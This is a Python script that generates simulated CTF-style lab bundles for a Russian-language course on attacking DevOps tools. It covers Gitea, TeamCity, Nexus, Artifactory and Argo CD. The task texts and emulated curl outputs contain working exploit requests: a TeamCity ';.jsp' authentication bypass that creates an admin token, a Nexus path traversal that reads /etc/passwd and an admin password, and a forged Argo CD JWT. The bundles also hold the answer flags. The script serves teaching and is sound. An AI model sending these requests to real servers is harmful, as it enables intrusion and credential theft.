#!/usr/bin/env python3
"""Write lab bundles for S8 devops lessons (gitea/teamcity/nexus/artifactory/argocd)."""
import json
import os

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LABS = os.path.join(ROOT, 'content', 'labs')
WD = '/home/student/task'

def write(b):
    with open(os.path.join(LABS, b['id'] + '.json'), 'w', encoding='utf-8') as f:
        json.dump(b, f, ensure_ascii=False, indent=2)
        f.write('\n')

write({
    'id': 'web-gitea-gogs', 'workdir': WD, 'hostname': 'lab',
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{g1t34_4n0n_s3cr3ts_1n_r3p0}'},
    'fs': [
        {'path': WD, 'type': 'dir'},
        {'path': WD + '/task.md', 'text': (
            "# Практика: секреты в открытом Gitea\n\n"
            "Цель: `http://gitea.local:3000`.\n\n"
            "1. Версия (открытый API):\n"
            "   curl -s http://gitea.local:3000/api/v1/version\n\n"
            "2. Перечисли репозитории анонимно:\n"
            "   curl -s 'http://gitea.local:3000/api/v1/repos/search'\n\n"
            "3. Прочитай конфиг из репозитория (raw):\n"
            "   curl -s http://gitea.local:3000/dev/backend/raw/branch/main/config/database.yml\n\n"
            "4. В конфиге — строка с флагом. Сохрани в found.txt и набери `check`.\n"
        )},
    ],
    'tools': {'curl': {'help': 'curl [опции] <url> — HTTP-клиент (эмуляция gitea.local)', 'cases': [
        {'match': 'database\\.yml|config/',
         'example': '-s http://gitea.local:3000/dev/backend/raw/branch/main/config/database.yml',
         'output': ('production:\n  host: db.internal\n  username: app\n  password: Pr0dDBpass!\n'
                    '  api_token: nto{g1t34_4n0n_s3cr3ts_1n_r3p0}\n')},
        {'match': 'repos/search',
         'example': "-s 'http://gitea.local:3000/api/v1/repos/search'",
         'output': '{"data":[{"id":1,"name":"backend","full_name":"dev/backend","private":false},{"id":2,"name":"frontend","full_name":"dev/frontend","private":false}]}\n'},
        {'match': 'api/v1/version',
         'example': '-s http://gitea.local:3000/api/v1/version',
         'output': '{"version":"1.21.0"}\n'},
    ], 'fallback': 'curl: в этой лабе эмулируется только gitea.local'}},
})

write({
    'id': 'web-teamcity', 'workdir': WD, 'hostname': 'lab',
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{t34mc1ty_4uth_byp4ss_t0_rce}'},
    'fs': [
        {'path': WD, 'type': 'dir'},
        {'path': WD + '/task.md', 'text': (
            "# Практика: TeamCity CVE-2023-42793\n\n"
            "Цель: `http://teamcity.local:8111`.\n\n"
            "1. Версия:\n"
            "   curl -s http://teamcity.local:8111/app/rest/server\n\n"
            "2. Убедись, что эндпоинт закрыт (ждём 401):\n"
            "   curl -s -o /dev/null -w '%{http_code}\\n' http://teamcity.local:8111/app/rest/users/id:1\n\n"
            "3. Обойди аутентификацию через `;.jsp`:\n"
            "   curl -s -o /dev/null -w '%{http_code}\\n' 'http://teamcity.local:8111/app/rest/users/id:1;.jsp'\n\n"
            "4. Создай токен админа и выполни команду:\n"
            "   curl -s -X POST 'http://teamcity.local:8111/app/rest/users/id:1/tokens/x;.jsp'\n\n"
            "5. В ответе — токен и флаг. Сохрани флаг в found.txt и набери `check`.\n"
        )},
    ],
    'tools': {'curl': {'help': 'curl [опции] <url> — HTTP-клиент (эмуляция teamcity.local)', 'cases': [
        {'match': 'tokens/',
         'example': "-s -X POST 'http://teamcity.local:8111/app/rest/users/id:1/tokens/x;.jsp'",
         'output': '{"name":"x","value":"eyJ0eXAiOiAiSldUIi...nto{t34mc1ty_4uth_byp4ss_t0_rce}"}\n'},
        {'match': 'users/id:1;\\.jsp|id:1;\\.jsp',
         'example': "-s -o /dev/null -w '%{http_code}' 'http://teamcity.local:8111/app/rest/users/id:1;.jsp'",
         'output': '200\n'},
        {'match': 'users/id:1',
         'example': "-s -o /dev/null -w '%{http_code}' http://teamcity.local:8111/app/rest/users/id:1",
         'output': '401\n'},
        {'match': 'app/rest/server',
         'example': '-s http://teamcity.local:8111/app/rest/server',
         'output': '<server version="2023.05.3" versionMajor="2023" versionMinor="05"/>\n'},
    ], 'fallback': 'curl: в этой лабе эмулируется только teamcity.local'}},
})

write({
    'id': 'web-nexus', 'workdir': WD, 'hostname': 'lab',
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{n3xus_tr4v3rs4l_adm1n_p4ssw0rd}'},
    'fs': [
        {'path': WD, 'type': 'dir'},
        {'path': WD + '/task.md', 'text': (
            "# Практика: Nexus CVE-2024-4956\n\n"
            "Цель: `http://nexus.local:8081`.\n\n"
            "1. Версия:\n"
            "   curl -s http://nexus.local:8081/service/rest/v1/status/check\n\n"
            "2. Проверь traversal — прочитай безобидный файл:\n"
            "   curl -s 'http://nexus.local:8081/repository/..%2f..%2f..%2f..%2f..%2fetc/passwd'\n\n"
            "3. Дочитай до пароля админа:\n"
            "   curl -s 'http://nexus.local:8081/repository/..%2f..%2f..%2f..%2f..%2fnexus-data/admin.password'\n\n"
            "4. В файле — строка с флагом. Сохрани в found.txt и набери `check`.\n"
        )},
    ],
    'tools': {'curl': {'help': 'curl [опции] <url> — HTTP-клиент (эмуляция nexus.local)', 'cases': [
        {'match': 'admin\\.password',
         'example': "-s 'http://nexus.local:8081/repository/..%2f..%2f..%2f..%2f..%2fnexus-data/admin.password'",
         'output': 'a1b2c3d4-initial-admin-password-nto{n3xus_tr4v3rs4l_adm1n_p4ssw0rd}\n'},
        {'match': 'etc/passwd',
         'example': "-s 'http://nexus.local:8081/repository/..%2f..%2f..%2f..%2f..%2fetc/passwd'",
         'output': 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n'},
        {'match': 'status/check',
         'example': '-s http://nexus.local:8081/service/rest/v1/status/check',
         'output': '{"healthy":true,"version":"3.68.0"}\n'},
        {'match': 'status',
         'example': '-s http://nexus.local:8081/service/rest/v1/status',
         'output': '{"version":"3.68.0","edition":"OSS"}\n'},
    ], 'fallback': 'curl: в этой лабе эмулируется только nexus.local'}},
})

write({
    'id': 'web-artifactory', 'workdir': WD, 'hostname': 'lab',
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{4rt1f4ct0ry_4n0n_4rt1f4ct_l34k}'},
    'fs': [
        {'path': WD, 'type': 'dir'},
        {'path': WD + '/task.md', 'text': (
            "# Практика: Artifactory анонимный доступ\n\n"
            "Цель: `http://artifactory.local:8082`.\n\n"
            "1. Проверка доступности:\n"
            "   curl -s http://artifactory.local:8082/artifactory/api/system/ping\n\n"
            "2. Список репозиториев анонимно:\n"
            "   curl -s http://artifactory.local:8082/artifactory/api/repositories\n\n"
            "3. Скачай конфиг из открытого репозитория:\n"
            "   curl -s 'http://artifactory.local:8082/artifactory/libs-release-local/com/corp/app/config.properties'\n\n"
            "4. В конфиге — строка с флагом. Сохрани в found.txt и набери `check`.\n"
        )},
    ],
    'tools': {'curl': {'help': 'curl [опции] <url> — HTTP-клиент (эмуляция artifactory.local)', 'cases': [
        {'match': 'config\\.properties|libs-release-local',
         'example': "-s 'http://artifactory.local:8082/artifactory/libs-release-local/com/corp/app/config.properties'",
         'output': ('db.host=db.internal\ndb.password=Pr0dDBpass!\n'
                    'api.token=nto{4rt1f4ct0ry_4n0n_4rt1f4ct_l34k}\n')},
        {'match': 'api/repositories',
         'example': '-s http://artifactory.local:8082/artifactory/api/repositories',
         'output': '[{"key":"libs-release-local","type":"LOCAL","packageType":"Maven"},{"key":"docker-local","type":"LOCAL","packageType":"Docker"}]\n'},
        {'match': 'api/system/version',
         'example': '-s http://artifactory.local:8082/artifactory/api/system/version',
         'output': '{"version":"7.77.0","revision":"77700900"}\n'},
        {'match': 'api/system/ping',
         'example': '-s http://artifactory.local:8082/artifactory/api/system/ping',
         'output': 'OK\n'},
    ], 'fallback': 'curl: в этой лабе эмулируется только artifactory.local'}},
})

write({
    'id': 'web-argocd', 'workdir': WD, 'hostname': 'lab',
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{4rg0cd_w34k_jwt_f0rg3_adm1n}'},
    'fs': [
        {'path': WD, 'type': 'dir'},
        {'path': WD + '/task.md', 'text': (
            "# Практика: Argo CD подделка JWT\n\n"
            "Цель: `https://argocd.local`.\n\n"
            "1. Версия:\n"
            "   curl -s -k https://argocd.local/api/version\n\n"
            "2. Проверь анонимный доступ:\n"
            "   curl -s -k https://argocd.local/api/v1/applications\n\n"
            "3. Секрет подписи слабый (дефолтный). Подпиши JWT с role:admin\n"
            "   (готовый токен уже в файле token.txt) и обратись к API:\n"
            "   curl -s -k https://argocd.local/api/v1/applications -H 'Authorization: Bearer TOKEN'\n\n"
            "4. В ответе — флаг. Сохрани в found.txt и набери `check`.\n"
        )},
        {'path': WD + '/token.txt', 'text': (
            'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.<forged-with-default-secret>\n'
        )},
    ],
    'tools': {'curl': {'help': 'curl [опции] <url> — HTTP-клиент (эмуляция argocd.local)', 'cases': [
        {'match': 'Bearer|token\\.txt',
         'example': "-s -k https://argocd.local/api/v1/applications -H 'Authorization: Bearer ...'",
         'output': '{"items":[{"metadata":{"name":"app"},{"secret":"nto{4rg0cd_w34k_jwt_f0rg3_adm1n}"}}]}\n'},
        {'match': 'api/v1/applications',
         'example': '-s -k -o /dev/null -w "%{http_code}" https://argocd.local/api/v1/applications',
         'output': '401\n'},
        {'match': 'api/version',
         'example': '-s -k https://argocd.local/api/version',
         'output': '{"Version":"v2.2.0","BuildDate":"2021-11-01T00:00:00Z"}\n'},
    ], 'fallback': 'curl: в этой лабе эмулируется только argocd.local'}},
})

print('s8 lab bundles written')
